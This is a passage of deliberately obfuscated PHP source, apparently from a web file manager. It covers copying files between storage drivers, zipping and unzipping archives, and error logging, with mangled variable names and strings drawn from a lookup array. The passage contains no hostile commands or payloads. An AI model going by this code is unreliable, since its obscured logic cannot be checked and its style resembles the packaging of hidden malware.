$«Ôœµ†À; if ($Å¥ÛéÈ) { $Ÿ¹ìÂ¥ã = $†ÌÑêäÅ->fileNameExist($ü¥²‚äÓ, $Ë°Êíâ¸); $†ØÙ•À = $Ë°Êíâ¸; $Ë°Êíâ¸ = $†ÌÑêäÅ->fileNameAuto($ü¥²‚äÓ, $Ë°Êíâ¸, $Å¥ÛéÈ, !$Á‚âµôˆ); if (!$Ÿ¹ìÂ¥ã || $†ØÙ•À != $Ë°Êíâ¸) { $Å¥ÛéÈ = !1; } if ($ğññ§åá && !$Å¥ÛéÈ) { $†ÌÑêäÅ->_data[$¡¬Ìä–è[1196]] = !0; } } if ($Á‚âµôˆ) { return self::copyFile($¥À³ƒ—°, $ Èº‡»», $†ÌÑêäÅ, $ü¥²‚äÓ, $Ë°Êíâ¸, $÷¸Î§²); } if ($Å¥ÛéÈ == REPEAT_RENAME_FOLDER) { $Å¥ÛéÈ = !1; } $¤æûĞÃ = rtrim($ü¥²‚äÓ, $¡¬Ìä–è[18]) . $¡¬Ìä–è[18] . $Ë°Êíâ¸; $Œåœë°ä = $†ÌÑêäÅ->mkdir($†ÌÑêäÅ->getPath($¤æûĞÃ), $Å¥ÛéÈ); $ü¥²‚äÓ = $†ÌÑêäÅ->getPathInner($Œåœë°ä); $»ñ®î…â = $¥À³ƒ—°->listPath($ Èº‡»», !0); $»ñ®î…â = is_array($»ñ®î…â) ? $»ñ®î…â : array($¡¬Ìä–è[93] => array(), $¡¬Ìä–è[92] => array()); $­•ÙŒš = array_merge($»ñ®î…â[$¡¬Ìä–è[93]], $»ñ®î…â[$¡¬Ìä–è[92]]); foreach ($­•ÙŒš as $Ö¥ó­¢) { $ —Áœı = $Ö¥ó­¢[$¡¬Ìä–è[43]] == $¡¬Ìä–è[224]; $ Èº‡»» = $¥À³ƒ—°->getPathInner($Ö¥ó­¢[$¡¬Ìä–è[94]]); $³¼Ä†ü = self::copyPath($¥À³ƒ—°, $ Èº‡»», $†ÌÑêäÅ, $ü¥²‚äÓ, $Å¥ÛéÈ, $÷¸Î§², $ —Áœı, !1, !1); if (!$³¼Ä†ü) { IO::errorTips($¡¬Ìä–è[1197] . $ Èº‡»» . $¡¬Ìä–è[80] . $ü¥²‚äÓ); } } self::copyMoveKeepInfo($¥À³ƒ—°, $ Èº‡»», $Œåœë°ä); return $Œåœë°ä; } private static function copyFile($‰„æ™, $„‹šĞÊ, $É‹ôÚ¡‘, $ååò×±§, $§—î˜€’, $·àİÖ«ƒ) { $¢™ªİÑˆ =& $_SERVER[ú÷îèÆÜ]; $ååò×±§ = $É‹ôÚ¡‘->getPath(rtrim($ååò×±§, $¢™ªİÑˆ[18]) . $¢™ªİÑˆ[18] . $§—î˜€’); $¼ãßÈŠ« = $¢™ªİÑˆ[1198] . time() . rand_string(5); Hook::trigger($¢™ªİÑˆ[1199], $‰„æ™, $„‹šĞÊ, $É‹ôÚ¡‘, $ååò×±§, $§—î˜€’, $¼ãßÈŠ«); if (self::driverIsSame($‰„æ™, $É‹ôÚ¡‘)) { if ($·àİÖ«ƒ) { $˜Ä†ı¡Œ = $É‹ôÚ¡‘->moveFile($„‹šĞÊ, $ååò×±§); } else { $˜Ä†ı¡Œ = $É‹ôÚ¡‘->copyFile($„‹šĞÊ, $ååò×±§); } Hook::trigger($¢™ªİÑˆ[1200], $‰„æ™, $„‹šĞÊ, $É‹ôÚ¡‘, $ååò×±§, $§—î˜€’, $˜Ä†ı¡Œ); self::copyMoveKeepInfo($‰„æ™, $„‹šĞÊ, $˜Ä†ı¡Œ); return $˜Ä†ı¡Œ; } $úìÀÛ­‹ = TEMP_FILES; if ($GLOBALS[$¢™ªİÑˆ[16]][$¢™ªİÑˆ[99]][$¢™ªİÑˆ[836]]) { $úìÀÛ­‹ = $GLOBALS[$¢™ªİÑˆ[16]][$¢™ªİÑˆ[99]][$¢™ªİÑˆ[836]]; } $ìôİ€ = $úìÀÛ­‹; mk_dir($ìôİ€); $æ¶ëë’Ä = $ìôİ€ . $¼ãßÈŠ«; $â´¬¼ªÓ = $æ¶ëë’Ä; $æ¶ëë’Ä = $‰„æ™->download($„‹šĞÊ, $æ¶ëë’Ä); $æ¶ëë’Ä = $‰„æ™->iconvApp($æ¶ëë’Ä); if (substr($æ¶ëë’Ä, strlen($úìÀÛ­‹)) == $úìÀÛ­‹) { $·àİÖ«ƒ = !0; } $˜Ä†ı¡Œ = $É‹ôÚ¡‘->upload($ååò×±§, $æ¶ëë’Ä, $·àİÖ«ƒ); self::remove($â´¬¼ªÓ); Hook::trigger($¢™ªİÑˆ[1200], $‰„æ™, $„‹šĞÊ, $É‹ôÚ¡‘, $ååò×±§, $§—î˜€’, $˜Ä†ı¡Œ); self::copyMoveKeepInfo($‰„æ™, $„‹šĞÊ, $˜Ä†ı¡Œ); return $˜Ä†ı¡Œ; } private static function copyMoveKeepInfo($ì–Úàø, $¾¢‡ìá£, $“·ı‘Ğ‚) { if (!$“·ı‘Ğ‚) { return; } $¨×±õ¦ë = $ì–Úàø->info($¾¢‡ìá£); if (!is_array($¨×±õ¦ë)) { return; } IO::setModifyTime($“·ı‘Ğ‚, $¨×±õ¦ë[$_SERVER[ú÷îèÆÜ][95]]); } public static function pathFather($ è’£˜«) { $ß´ãÚ–« = IO::init($ è’£˜«); $¼•ó×É = $ß´ãÚ–«->pathFather($ß´ãÚ–«->path); return $ß´ãÚ–«->getPathOuter($¼•ó×É); } public static function fileOut($®­ƒºñÏ, $ÙÉ‡«Ã˜ = false, $»¥¡â’ = false, $î¨Çã = '') { $’¼¦Ãü÷ = self::driverMake($®­ƒºñÏ); if ($’¼¦Ãü÷->isFileOutServer()) { return $’¼¦Ãü÷->fileOutServer($®­ƒºñÏ, $ÙÉ‡«Ã˜, $»¥¡â’, $î¨Çã); } return $’¼¦Ãü÷->fileOut($®­ƒºñÏ, $ÙÉ‡«Ã˜, $»¥¡â’, $î¨Çã); } public static function fileOutImage($öºÈó®, $ı¸ÇÚÓô = 250) { $µéÅ¯æ = array(250, 600, 1200, 2000, 3000, 5000); for ($É—±‹Ö¯ = 0; $É—±‹Ö¯ < count($µéÅ¯æ); $É—±‹Ö¯++) { if ($É—±‹Ö¯ == 0 && $ı¸ÇÚÓô <= $µéÅ¯æ[$É—±‹Ö¯]) { $ı¸ÇÚÓô = $µéÅ¯æ[$É—±‹Ö¯]; break; } else { if ($ı¸ÇÚÓô > $µéÅ¯æ[$É—±‹Ö¯ - 1] && $ı¸ÇÚÓô <= $µéÅ¯æ[$É—±‹Ö¯]) { $ı¸ÇÚÓô = $µéÅ¯æ[$É—±‹Ö¯]; break; } else { if ($É—±‹Ö¯ == count($µéÅ¯æ) - 1 && $ı¸ÇÚÓô > $µéÅ¯æ[$É—±‹Ö¯]) { $ı¸ÇÚÓô = $µéÅ¯æ[$É—±‹Ö¯]; break; } } } } $ˆåˆ…… = self::driverMake($öºÈó®); if ($ˆåˆ……->isFileOutServer()) { return $ˆåˆ……->fileOutImageServer($öºÈó®, $ı¸ÇÚÓô); } return $ˆåˆ……->fileOutImage($öºÈó®, $ı¸ÇÚÓô); } private static function driverIsSame($¾Ä¸›İ˜, $É‰ôÚ) { $ Ó¦…ü =& $_SERVER[ú÷îèÆÜ]; $¬ı‹ü»İ = $¾Ä¸›İ˜->getType(); $¨ğØŞ« = $É‰ôÚ->getType(); if ($¬ı‹ü»İ != $¨ğØŞ«) { return !1; } if ($¬ı‹ü»İ == $ Ó¦…ü[797]) { return !0; } if ($¬ı‹ü»İ == $ Ó¦…ü[116]) { return !0; } if ($¾Ä¸›İ˜->pathDriver == $É‰ôÚ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Å‹èÚü³, $°Ø‚•Ïè) { $³Ë£Æö =& $_SERVER[ú÷îèÆÜ]; if (!IO::exist($Å‹èÚü³)) { return !1; } if (!IO::exist($°Ø‚•Ïè)) { IO::mkdir($°Ø‚•Ïè); } $Áƒá‚«… = array_to_keyvalue(self::listAllSimple($Å‹èÚü³), $³Ë£Æö[94]); $„ÁŸ´…ı = array_to_keyvalue(self::listAllSimple($°Ø‚•Ïè), $³Ë£Æö[94]); $÷ò·½Ö = array(); $şËÆèœ² = array(); foreach ($Áƒá‚«… as $¤•íŒµ => $õµòÉİş) { if (isset($„ÁŸ´…ı[$¤•íŒµ])) { if ($õµòÉİş[$³Ë£Æö[85]] == 1) { continue; } if ($„ÁŸ´…ı[$¤•íŒµ][$³Ë£Æö[86]] == $õµòÉİş[$³Ë£Æö[86]]) { continue; } } if ($õµòÉİş[$³Ë£Æö[85]] == 1) { $şËÆèœ²[] = $°Ø‚•Ïè . $³Ë£Æö[18] . trim($¤•íŒµ, $³Ë£Æö[18]); continue; } $ÓÇœÌÎÂ = strstr(trim($¤•íŒµ, $³Ë£Æö[18]), $³Ë£Æö[18]) ? get_path_father($¤•íŒµ) : $³Ë£Æö[22]; $÷ò·½Ö[] = array($³Ë£Æö[1201] => $õµòÉİş[$³Ë£Æö[96]], $³Ë£Æö[1202] => rtrim($°Ø‚•Ïè, $³Ë£Æö[18]) . $³Ë£Æö[18] . $ÓÇœÌÎÂ, $³Ë£Æö[1203] => $õµòÉİş); } $™†‰¯Ê” = array($³Ë£Æö[224] => $÷ò·½Ö, $³Ë£Æö[85] => $şËÆèœ²); Hook::trigger($³Ë£Æö[1204], $Å‹èÚü³, $°Ø‚•Ïè, $™†‰¯Ê”); foreach ($şËÆèœ² as $õµòÉİş) { IO::mkdir($õµòÉİş); } foreach ($÷ò·½Ö as $õµòÉİş) { IO::copy($õµòÉİş[$³Ë£Æö[1201]], $õµòÉİş[$³Ë£Æö[1202]], REPEAT_REPLACE); } } public static function fileSubstr($¢îèÙœÍ, $½Ïôƒ‹«, $™·ÁŠÓ = false) { $ï­ö…‹Š =& $_SERVER[ú÷îèÆÜ]; $¼Æ³Š¤ = self::driverMake($¢îèÙœÍ); $«¸£¯¸ = $¼Æ³Š¤->size($¢îèÙœÍ); $£ğ¬•ØŠ = $½Ïôƒ‹«; $¼Ú•Ší† = $™·ÁŠÓ; if ($½Ïôƒ‹« < 0) { $½Ïôƒ‹« = $«¸£¯¸ + $½Ïôƒ‹«; } if ($™·ÁŠÓ === !1) { $™·ÁŠÓ = $«¸£¯¸ - $½Ïôƒ‹«; } if ($½Ïôƒ‹« + $™·ÁŠÓ > $«¸£¯¸) { $™·ÁŠÓ = $«¸£¯¸ - $½Ïôƒ‹«; } if (!$«¸£¯¸ && $¼Æ³Š¤->getType() == $ï­ö…‹Š[116] && !$¼Æ³Š¤->exist($¢îèÙœÍ)) { $®–©Æø‘ = get_path_this($¢îèÙœÍ); $Œ“èéĞ = parse_url_query($®–©Æø‘); if (is_array($Œ“èéĞ) && isset($Œ“èéĞ[$ï­ö…‹Š[42]])) { $®–©Æø‘ = urldecode($Œ“èéĞ[$ï­ö…‹Š[42]]); } throw new Exception($ï­ö…‹Š[1205] . LNG($ï­ö…‹Š[1206]) . $ï­ö…‹Š[1007] . clear_html($®–©Æø‘) . $ï­ö…‹Š[22]); } if ($™·ÁŠÓ <= 0) { return $ï­ö…‹Š[22]; } if ($½Ïôƒ‹« < 0 || $½Ïôƒ‹« >= $«¸£¯¸ || $™·ÁŠÓ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\x6c\145\x52\145\x61\144\40\x65\x72\162\x6f\162\41\x20\x73\164\141\x72\164\x3d{$½Ïôƒ‹«}\x3b\x6c\x65\x6e\x67\164\150\75{$™·ÁŠÓ}\x3b\x20\163\x69\172\145\75{$«¸£¯¸}\73"); } $íë€”ÆÍ = $¼Æ³Š¤->fileSubstr($¢îèÙœÍ, $½Ïôƒ‹«, $™·ÁŠÓ); if (!$íë€”ÆÍ && $™·ÁŠÓ && isset($GLOBALS[$ï­ö…‹Š[1207]])) { throw new Exception($GLOBALS[$ï­ö…‹Š[1207]][$ï­ö…‹Š[1208]]); } return $íë€”ÆÍ; } private static function driverMake(&$Ì¶™ˆÖ) { $´³Ì€‹ =& $_SERVER[ú÷îèÆÜ]; $ğãë¢… = KodIO::parse($Ì¶™ˆÖ); if (!self::$driverListSystem) { $…ãÍ†Øì = Model($´³Ì€‹[807])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($…ãÍ†Øì, $´³Ì€‹[452]); } if ($ğãë¢…[$´³Ì€‹[43]] == KodIO::KOD_IO && !self::$driverListSystem[$ğãë¢…[$´³Ì€‹[452]]]) { return !1; } $Ì¶™ˆÖ = $ğãë¢…[$´³Ì€‹[1209]]; $ŒÎ¤¾§ö = self::driverGet($ğãë¢…, $Ì¶™ˆÖ); return $ŒÎ¤¾§ö; } private static function driverGet($Ôš®ì•Ï, &$¹¶÷ÁÑ) { $­‚ĞÔÏ· =& $_SERVER[ú÷îèÆÜ]; $Ü†ÀÙäµ = $Ôš®ì•Ï[$­‚ĞÔÏ·[1210]]; $¯Ñ Õã = $Ôš®ì•Ï[$­‚ĞÔÏ·[452]]; switch ($Ôš®ì•Ï[$­‚ĞÔÏ·[43]]) { case KodIO::KOD_IO: $¥Šïº€´ = self::$driverListSystem[$¯Ñ Õã]; break; case KodIO::KOD_SOURCE: $¹¶÷ÁÑ = $¯Ñ Õã . $¹¶÷ÁÑ; $¥Šïº€´ = array($­‚ĞÔÏ·[1211] => $­‚ĞÔÏ·[1212], $­‚ĞÔÏ·[16] => $Ôš®ì•Ï); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¼¾ÕÍ†¬ = $GLOBALS[$­‚ĞÔÏ·[1213]]; self::$driverListUser = array_to_keyvalue($¼¾ÕÍ†¬, $­‚ĞÔÏ·[452]); } $¥Šïº€´ = self::$driverListUser[$¯Ñ Õã]; break; case KodIO::KOD_SHARE_LINK: $¥Šïº€´ = array($­‚ĞÔÏ·[1211] => $­‚ĞÔÏ·[1214], $­‚ĞÔÏ·[16] => $Ôš®ì•Ï); $Ö•Ìš´ô = Action($­‚ĞÔÏ·[1215])->sharePathInfo($Ôš®ì•Ï[$­‚ĞÔÏ·[94]]); $¹¶÷ÁÑ = $Ö•Ìš´ô[$­‚ĞÔÏ·[191]]; if (!$Ö•Ìš´ô[$­‚ĞÔÏ·[191]]) { $ñ²Ãş© = Model($­‚ĞÔÏ·[641])->getInfo($Ö•Ìš´ô[$­‚ĞÔÏ·[642]]); $¹¶÷ÁÑ = KodIO::clear($ñ²Ãş©[$­‚ĞÔÏ·[1216]] . $Ôš®ì•Ï[$­‚ĞÔÏ·[1209]]); $Ôš®ì•Ï[$­‚ĞÔÏ·[537]] = $ñ²Ãş©; $Ôš®ì•Ï[$­‚ĞÔÏ·[1192]] = $¹¶÷ÁÑ; $¥Šïº€´ = array($­‚ĞÔÏ·[1211] => $­‚ĞÔÏ·[1217], $­‚ĞÔÏ·[16] => $Ôš®ì•Ï); } break; case KodIO::KOD_SHARE_ITEM: $¥Šïº€´ = array($­‚ĞÔÏ·[1211] => $­‚ĞÔÏ·[1218], $­‚ĞÔÏ·[16] => $Ôš®ì•Ï); $ñ²Ãş© = Model($­‚ĞÔÏ·[641])->getInfo($Ôš®ì•Ï[$­‚ĞÔÏ·[452]]); if ($ñ²Ãş©[$­‚ĞÔÏ·[191]] == $­‚ĞÔÏ·[222]) { $¹¶÷ÁÑ = KodIO::clear($ñ²Ãş©[$­‚ĞÔÏ·[1216]] . $Ôš®ì•Ï[$­‚ĞÔÏ·[1209]]); $Ôš®ì•Ï[$­‚ĞÔÏ·[537]] = $ñ²Ãş©; $Ôš®ì•Ï[$­‚ĞÔÏ·[1192]] = $¹¶÷ÁÑ; $¥Šïº€´ = array($­‚ĞÔÏ·[1211] => $­‚ĞÔÏ·[1219], $­‚ĞÔÏ·[16] => $Ôš®ì•Ï); } else { if (!$¹¶÷ÁÑ) { $¹¶÷ÁÑ = $ñ²Ãş©[$­‚ĞÔÏ·[191]]; } } break; default: $¹¶÷ÁÑ = $Ôš®ì•Ï[$­‚ĞÔÏ·[94]]; $¥Šïº€´ = array($­‚ĞÔÏ·[1211] => $­‚ĞÔÏ·[1220]); break; } $…ìÖã = $Ôš®ì•Ï[$­‚ĞÔÏ·[94]]; if (!isset(self::$driverCache[$…ìÖã])) { $ÉÛ‘á«± = strtolower($¥Šïº€´[$­‚ĞÔÏ·[105]]); $¢Ë·ÆÉø = $GLOBALS[$­‚ĞÔÏ·[16]][$­‚ĞÔÏ·[99]][$­‚ĞÔÏ·[866]]; $¡”ï½§ = $­‚ĞÔÏ·[84] . (isset($¢Ë·ÆÉø[$ÉÛ‘á«±]) ? $¢Ë·ÆÉø[$ÉÛ‘á«±] : ucfirst($ÉÛ‘á«±)); if (!class_exists($¡”ï½§)) { show_json("{$¡”ï½§}\x20\x6e\x6f\x74\40\145\x78\x69\x73\164\x73\41", !1); } $™‡¼ïØ = isset($¥Šïº€´[$­‚ĞÔÏ·[16]]) ? $¥Šïº€´[$­‚ĞÔÏ·[16]] : !1; self::$driverCache[$…ìÖã] = new $¡”ï½§($™‡¼ïØ); } $Ñ—àŠ© = self::$driverCache[$…ìÖã]; $Ñ—àŠ©->pathDriver = $Ü†ÀÙäµ; $Ñ—àŠ©->pathBase = $­‚ĞÔÏ·[22]; if (isset($¥Šïº€´[$­‚ĞÔÏ·[16]][$­‚ĞÔÏ·[1221]])) { $Ñ—àŠ©->pathBase = rtrim($¥Šïº€´[$­‚ĞÔÏ·[16]][$­‚ĞÔÏ·[1221]], $­‚ĞÔÏ·[18]) . $­‚ĞÔÏ·[18]; $¹¶÷ÁÑ = $Ñ—àŠ©->pathBase . ltrim($¹¶÷ÁÑ, $­‚ĞÔÏ·[18]); } $¹¶÷ÁÑ = $Ñ—àŠ©->getPath($¹¶÷ÁÑ); if (isset($Ôš®ì•Ï[$­‚ĞÔÏ·[1192]])) { $¹¶÷ÁÑ = $Ôš®ì•Ï[$­‚ĞÔÏ·[1192]]; } $Ñ—àŠ©->path = $¹¶÷ÁÑ; return $Ñ—àŠ©; } public static function errorTips($È¬®é›Ù = false) { $µÂşÃ¡ª =& $_SERVER[ú÷îèÆÜ]; static $áòÉ‘ê¯ = array(); $í…‡óÇæ = 1000; if ($È¬®é›Ù === -1) { return $áòÉ‘ê¯ ? $áòÉ‘ê¯[count($áòÉ‘ê¯) - 1] : $µÂşÃ¡ª[22]; } if ($È¬®é›Ù === !1) { return implode($µÂşÃ¡ª[11], $áòÉ‘ê¯); } if (count($áòÉ‘ê¯) >= $í…‡óÇæ) { $áòÉ‘ê¯ = array_slice($áòÉ‘ê¯, $í…‡óÇæ * 0.5, $í…‡óÇæ); } $áòÉ‘ê¯[] = $È¬®é›Ù; write_log($µÂşÃ¡ª[173] . ACTION . $µÂşÃ¡ª[1222] . $È¬®é›Ù, $µÂşÃ¡ª[1223]); } public static function getLastError($£ì©“Ãü = '') { $…£ç¹³‘ = self::errorTips(-1); return $…£ç¹³‘ ? $…£ç¹³‘ : $£ì©“Ãü; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ı¶ğÏÑæ; if ($ı¶ğÏÑæ) { return $ı¶ğÏÑæ; } $£…Ûå·ã = IO::init($_SERVER[ú÷îèÆÜ][18]); return $£…Ûå·ã; } private static function iconvSystem($Ì§Õˆ™) { return self::local()->iconvSystem($Ì§Õˆ™); } private static function iconvApp($²èÎ”™á) { return self::local()->iconvApp($²èÎ”™á); } public static function zipFolder($ïÖÕĞÆÌ, $Ÿİ¹Ù¦ = "\172\x69\x70", $ƒƒÈùù = '', $›÷ÚêÅ™ = REPEAT_RENAME) { $îÖûÊšı =& $_SERVER[ú÷îèÆÜ]; $¸İÒ×™» = IO::listPath($ïÖÕĞÆÌ); if (!$¸İÒ×™») { return !1; } $¸İÒ×™» = array_merge($¸İÒ×™»[$îÖûÊšı[92]], $¸İÒ×™»[$îÖûÊšı[93]]); return self::zip($¸İÒ×™», $Ÿİ¹Ù¦, $ƒƒÈùù, $›÷ÚêÅ™); } public static function zip($øĞãû¶, $¦ˆëì¶é = "\172\x69\160", $×—ùôä¾ = '', $Â–—áş£ = REPEAT_RENAME) { $´—£Óƒ³ =& $_SERVER[ú÷îèÆÜ]; if (is_string($øĞãû¶) && $øĞãû¶) { $øĞãû¶ = array(array($´—£Óƒ³[94] => $øĞãû¶)); } $òÑ«ÄÔè = self::init($øĞãû¶[0][$´—£Óƒ³[94]]); $Æ‡„²øĞ = self::info($øĞãû¶[0][$´—£Óƒ³[94]]); $È¾ÃøŠÀ = $´—£Óƒ³[22]; $ğşÈ•îÖ = $´—£Óƒ³[22]; $­†İ¹åê = $´—£Óƒ³[22]; if ($×—ùôä¾ && substr($×—ùôä¾, -1, 1) != $´—£Óƒ³[18]) { $ğşÈ•îÖ = get_path_father($×—ùôä¾); $­†İ¹åê = get_path_this($×—ùôä¾); } else { $ğşÈ•îÖ = self::pathFather($Æ‡„²øĞ[$´—£Óƒ³[94]]); $­†İ¹åê = $Æ‡„²øĞ[$´—£Óƒ³[42]] . $´—£Óƒ³[20] . $¦ˆëì¶é; if (count($øĞãû¶) > 1) { $ÀˆÖÏçİ = IO::info($ğşÈ•îÖ); $­†İ¹åê = $ÀˆÖÏçİ[$´—£Óƒ³[42]] . $´—£Óƒ³[20] . $¦ˆëì¶é; } if ($×—ùôä¾) { $ğşÈ•îÖ = $×—ùôä¾; } } if ($òÑ«ÄÔè->getType() == $´—£Óƒ³[116]) { $ıâÎ“ØÔ = self::init($ğşÈ•îÖ); $Ä¬ıúíœ = $ıâÎ“ØÔ->getType() == $´—£Óƒ³[116] ? $ğşÈ•îÖ : get_path_father($òÑ«ÄÔè->path); $Ä¬ıúíœ = rtrim($Ä¬ıúíœ, $´—£Óƒ³[18]) . $´—£Óƒ³[18]; mk_dir($Ä¬ıúíœ); } else { $È¾ÃøŠÀ = TEMP_FILES . $´—£Óƒ³[1224] . time() . rand_string(8) . $´—£Óƒ³[18]; mk_dir($È¾ÃøŠÀ); file_put_contents($È¾ÃøŠÀ . $´—£Óƒ³[1225], $´—£Óƒ³[22]); $Ä¬ıúíœ = $È¾ÃøŠÀ; } $ÒãŸñÜ– = IO::info($Ä¬ıúíœ); if (!$ÒãŸñÜ– || !$ÒãŸñÜ–[$´—£Óƒ³[227]]) { show_json(LNG($´—£Óƒ³[1226]), !1); } $¥Õ•Ñî¶ = self::zipFileList($øĞãû¶, $È¾ÃøŠÀ); foreach ($¥Õ•Ñî¶ as $‚Å¹õåê => $ÊÙóıõ€) { $¥Õ•Ñî¶[$‚Å¹õåê] = self::iconvSystem($ÊÙóıõ€); } $ÎçÅ€Ê‹ = get_filename_auto($Ä¬ıúíœ . $­†İ¹åê, $´—£Óƒ³[22], $Â–—áş£); KodArchive::create(self::iconvSystem($ÎçÅ€Ê‹), $¥Õ•Ñî¶); if (!IO::exist($ÎçÅ€Ê‹)) { if ($È¾ÃøŠÀ) { del_dir($È¾ÃøŠÀ); } show_json(LNG($´—£Óƒ³[1227]), !1); } if (!$È¾ÃøŠÀ) { return $ÎçÅ€Ê‹; } $÷…Ú‚ùœ = self::move($ÎçÅ€Ê‹, $ğşÈ•îÖ, $Â–—áş£); if ($È¾ÃøŠÀ) { del_dir($È¾ÃøŠÀ); } if (!$ÎçÅ€Ê‹) { show_json(LNG($´—£Óƒ³[1227]), !1); } return $÷…Ú‚ùœ; } public static function unzip($æß´ÏËÉ, $Í¸Ô­â™, $Î´şü = "\x2d\x31", $ÍºÌ˜å = "\162\x65\x70\154\x61\x63\x65") { $£½…Ó£ö =& $_SERVER[ú÷îèÆÜ]; $ÍÅ³Ü¯” = parent::info($æß´ÏËÉ); if (!$ÍÅ³Ü¯”) { show_json(LNG($£½…Ó£ö[1228]), !1); } $«æî‡œ³ = IO::infoFullSimple($Í¸Ô­â™); if (!$«æî‡œ³) { $Í¸Ô­â™ = IO::mkdir($Í¸Ô­â™); } if (isset($«æî‡œ³[$£½…Ó£ö[191]]) && trim($«æî‡œ³[$£½…Ó£ö[94]], $£½…Ó£ö[18]) != trim($Í¸Ô­â™, $£½…Ó£ö[18])) { $˜…÷¤ = KodIO::make($«æî‡œ³[$£½…Ó£ö[190]]); $—ÆøÍÍÜ = IO::fileNameAuto($˜…÷¤, $«æî‡œ³[$£½…Ó£ö[42]], REPEAT_RENAME_FOLDER, !0); $Í¸Ô­â™ = IO::mkdir($˜…÷¤ . $—ÆøÍÍÜ); } $Î´şü = $Î´şü && $Î´şü != $£½…Ó£ö[1229] ? @json_decode($Î´şü, !0) : -1; $Õı’ƒ› = self::unzipPart($æß´ÏËÉ, $Î´şü); if (!$Õı’ƒ› || !IO::exist($Õı’ƒ›[$£½…Ó£ö[224]])) { show_json(LNG($£½…Ó£ö[115]), !1); } $ı‹ÚÙ¬ = $Õı’ƒ›[$£½…Ó£ö[1230]][count($Õı’ƒ›[$£½…Ó£ö[1230]]) - 1]; if ($ı‹ÚÙ¬[$£½…Ó£ö[1231]] == -1 || substr($ı‹ÚÙ¬[$£½…Ó£ö[42]], -1, 1) == $£½…Ó£ö[18]) { $²²Ã‡âõ = $Õı’ƒ›[$£½…Ó£ö[1232]] . rand_string(10) . $£½…Ó£ö[18]; mk_dir($²²Ã‡âõ); $ó¥Ç‘ãÅ = count($Õı’ƒ›[$£½…Ó£ö[1230]]) == 1 ? IO::ext($æß´ÏËÉ) : get_path_ext($Õı’ƒ›[$£½…Ó£ö[224]]); $¼¬ÅÛ£ş = KodArchive::extract(self::iconvSystem($Õı’ƒ›[$£½…Ó£ö[224]]), $²²Ã‡âõ, $ı‹ÚÙ¬[$£½…Ó£ö[1231]], $—ÆøÍÍÜ, $ó¥Ç‘ãÅ); self::unzipErrorCheck($¼¬ÅÛ£ş, array($£½…Ó£ö[1233], $æß´ÏËÉ, $ó¥Ç‘ãÅ, $Í¸Ô­â™, $Õı’ƒ›)); Hook::trigger($£½…Ó£ö[1234], $²²Ã‡âõ); recursion_dir($²²Ã‡âõ, $²èÇ›Àü, $ÍÕ‡¬¾, 0); $ô§ùŠ‰® = array_merge($²èÇ›Àü, $ÍÕ‡¬¾); $Õş¿­î¤ = array(); foreach ($ô§ùŠ‰® as $Ì÷ù’ëÀ) { $¦¸ì¤°Û = IO::move(self::iconvApp($Ì÷ù’ëÀ), $Í¸Ô­â™, $ÍºÌ˜å); if ($¦¸ì¤°Û) { $Õş¿­î¤[] = $¦¸ì¤°Û; } } del_dir($²²Ã‡âõ); } else { $¦¸ì¤°Û = IO::move($Õı’ƒ›[$£½…Ó£ö[224]], $Í¸Ô­â™, $ÍºÌ˜å, get_path_this($ı‹ÚÙ¬[$£½…Ó£ö[42]])); if ($¦¸ì¤°Û) { $Õş¿­î¤[] = $¦¸ì¤°Û; } } return $Õş¿­î¤ ? $Õş¿­î¤ : !1; } public static function unzipList($´ˆ¨—Á’) { $·¦ÔÑ =& $_SERVER[ú÷îèÆÜ]; $Ü×‘‘» = isset($´ˆ¨—Á’[$·¦ÔÑ[1235]]) ? $´ˆ¨—Á’[$·¦ÔÑ[1235]] : !1; $Ìº”Ñ¶Ê = isset($´ˆ¨—Á’[$·¦ÔÑ[1231]]) ? @json_decode($´ˆ¨—Á’[$·¦ÔÑ[1231]], !0) : -1; $­½§íù­ = self::unzipPart($´ˆ¨—Á’[$·¦ÔÑ[94]], $Ìº”Ñ¶Ê); if (!$­½§íù­ || !IO::exist($­½§íù­[$·¦ÔÑ[224]])) { show_json(LNG($·¦ÔÑ[115]), !1); } $ÊíİïÆ¡ = $­½§íù­[$·¦ÔÑ[1230]][count($­½§íù­[$·¦ÔÑ[1230]]) - 1]; $ŠÂ”ê = in_array(IO::ext($­½§íù­[$·¦ÔÑ[224]]), array($·¦ÔÑ[366], $·¦ÔÑ[1236], $·¦ÔÑ[1237], $·¦ÔÑ[1238], $·¦ÔÑ[1239], $·¦ÔÑ[1240])); if (!$Ü×‘‘» && ($ÊíİïÆ¡[$·¦ÔÑ[1231]] == -1 || $ŠÂ”ê)) { $²Ÿ¸Œ×ß = $­½§íù­[$·¦ÔÑ[1232]] . get_path_this($­½§íù­[$·¦ÔÑ[224]]) . $·¦ÔÑ[1241]; if (!IO::exist($²Ÿ¸Œ×ß)) { $‹Æ¿Ş¢ = $ÊíİïÆ¡[$·¦ÔÑ[1231]] == -1 ? get_path_ext(IO::pathThis($´ˆ¨—Á’[$·¦ÔÑ[94]])) : get_path_ext($­½§íù­[$·¦ÔÑ[224]]); $ƒÓŸ½å˜ = KodArchive::listContent(self::iconvSystem($­½§íù­[$·¦ÔÑ[224]]), !0, $‹Æ¿Ş¢); self::unzipErrorCheck($ƒÓŸ½å˜, array($·¦ÔÑ[1242], $´ˆ¨—Á’, $­½§íù­)); @file_put_contents($²Ÿ¸Œ×ß, json_encode($ƒÓŸ½å˜[$·¦ÔÑ[1243]])); } return @json_decode(IO::getContent($²Ÿ¸Œ×ß), !0); } IO::fileOut($­½§íù­[$·¦ÔÑ[224]], $Ü×‘‘», get_path_this($ÊíİïÆ¡[$·¦ÔÑ[42]])); die; } private static function zipFileList($ÆÀÉú·, $ãìº­© = false) { $¦òŠØÏƒ =& $_SERVER[ú÷îèÆÜ]; $û„ä·­¤ = array(); foreach ($ÆÀÉú· as $Şä÷–©) { $¢¹ç‚ÈÊ = $Şä÷–©[$¦òŠØÏƒ[94]]; if ($ãìº­©) { $¢¹ç‚ÈÊ = self::copy($Şä÷–©[$¦òŠØÏƒ[94]], $ãìº­©, $¦òŠØÏƒ[858]); } else { $‹ÕÄşû¼ = self::init($Şä÷–©[$¦òŠØÏƒ[94]]); if ($‹ÕÄşû¼->getType() == $¦òŠØÏƒ[116]) { $¢¹ç‚ÈÊ = $‹ÕÄşû¼->path; } } if ($¢¹ç‚ÈÊ && self::local()->exist($¢¹ç‚ÈÊ)) { 